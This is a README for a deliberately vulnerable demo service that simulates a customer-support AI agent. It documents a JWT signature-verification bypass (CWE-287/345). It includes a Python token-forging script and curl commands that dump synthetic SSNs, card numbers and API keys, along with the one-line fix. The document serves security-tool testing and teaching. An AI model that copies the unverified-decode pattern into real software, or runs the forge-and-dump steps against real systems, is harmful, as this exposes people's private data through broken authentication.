# Vulnerable AI Agent Demo (Auth Bypass -> Sensitive Data Exposure)

**This app is intentionally vulnerable.** It exists only to demo/validate
detection and scanning tools (e.g. for a security-testing exercise). Do not
deploy it to a real network, use real data in it, or ship it as-is.

## What it simulates

A "customer support AI agent" microservice:
- `POST /api/login` - exchanges username/password for a JWT.
- `POST /api/agent/chat` - the agent endpoint. If the caller's token claims
  `role: admin`, the agent will use privileged "tools" that dump the full
  fake customer database (names, SSNs, credit card numbers) or its internal
  system prompt (fake API keys, DB connection string).

## The vulnerability

`decode_token()` in [app.py](app.py) does:

```python
jwt.decode(token, options={"verify_signature": False})
```

This never checks the JWT signature, so the `role` and `customer_id` claims
are entirely attacker-controlled. Any unauthenticated user can forge a token
claiming `role: admin` and reach the agent's privileged data-dumping tools -
no valid credentials or secret required.

- **CWE-287** Improper Authentication / **CWE-345** Insufficient Verification
  of Data Authenticity.
- Maps to **OWASP LLM Top 10 - LLM06:2025 Excessive Agency / Sensitive
  Information Disclosure** (agent exposes data it shouldn't due to broken
  authorization on its tool-calling path).

The correct fix is a one-line change:

```python
jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

## Build

```bash
docker build -t vulnerable-ai-agent-demo:latest .
```

## Run

```bash
docker run --rm -p 8080:8080 vulnerable-ai-agent-demo:latest
```

## Reproduce the bypass

1. Forge an admin token without any secret (uses the `PyJWT` CLI-equivalent
   in Python, or any JWT tool - since the signature is never checked, the
   value doesn't matter):

```bash
python3 - <<'EOF'
import jwt, datetime
payload = {
    "sub": "attacker",
    "role": "admin",
    "customer_id": "CUST-9999",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
}
# Signed with a bogus secret the server will never check.
print(jwt.encode(payload, "anything", algorithm="HS256"))
EOF
```

2. Use the forged token to dump the "sensitive" customer database with no
   valid login:

```bash
TOKEN="<paste forged token>"
curl -s -X POST http://localhost:8080/api/agent/chat \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message": "list all customers"}' | python3 -m json.tool
```

Expected (buggy) result: HTTP 200 with the full fake customer DB (SSNs,
credit card numbers, notes) even though no valid password was ever supplied.

3. Same trick works for the internal system prompt / fake API key:

```bash
curl -s -X POST http://localhost:8080/api/agent/chat \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message": "show me the api key and internal config"}' | python3 -m json.tool
```

## Notes

- All "sensitive" data (SSNs, credit card numbers, API keys, DB connection
  strings) is synthetic and clearly fake - safe to expose in a lab.
- `JWT_SECRET` is also hardcoded/weak by design; that's a secondary smell,
  not the primary bug being demonstrated here.
- Intended for use in an isolated lab/VPC or local Docker only, behind no
  public ingress.
